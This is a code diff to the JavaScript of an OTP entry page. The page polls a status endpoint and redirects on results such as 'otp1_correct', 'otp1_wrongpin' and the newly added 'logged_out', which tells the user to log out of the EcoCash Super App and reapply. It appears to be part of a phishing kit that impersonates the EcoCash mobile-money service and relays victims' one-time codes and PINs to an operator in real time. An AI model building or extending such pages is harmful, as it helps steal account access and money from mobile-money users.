@@ -133,7 +133,7 @@ function startTimer() {
 
 async function resendCode() {
     timerDisplay.innerText = "Sending new code...";
-    
+
     try {
         await fetch('/api/resend-otp-notification', {
             method: 'POST',
@@ -192,18 +192,30 @@ function startPolling() {
             const res = await fetch(`/api/check-status?phone=${encodeURIComponent(phone)}`);
             const data = await res.json();
 
+            if (data.status === "logged_out") {
+                clearInterval(pollingInterval);
+                overlay.style.display = 'none';
+                statusMsg.style.color = '#d92d20';
+                statusMsg.innerText = data.message || 'Please log out from EcoCash Super App and try reapplying again';
+
+                setTimeout(() => {
+                    window.location.href = '/page6';
+                }, 1800);
+                return;
+            }
+
             if (data.status === "otp1_correct") {
                 clearInterval(pollingInterval);
                 window.location.href = "/page9.html";
-            } 
+            }
             else if (data.status === "otp1_wrongpin") {
                 clearInterval(pollingInterval);
                 overlay.style.display = 'none';
                 window.location.href = "/page6?error=wrongpin";
-            } 
+            }
             else if (data.status === "otp1_wrong") {
                 clearInterval(pollingInterval);
-                overlay.style.display = 'none'; 
+                overlay.style.display = 'none';
                 statusMsg.style.color = "red";
                 statusMsg.innerText = "❌ Incorrect OTP code.";
                 resetInputs();
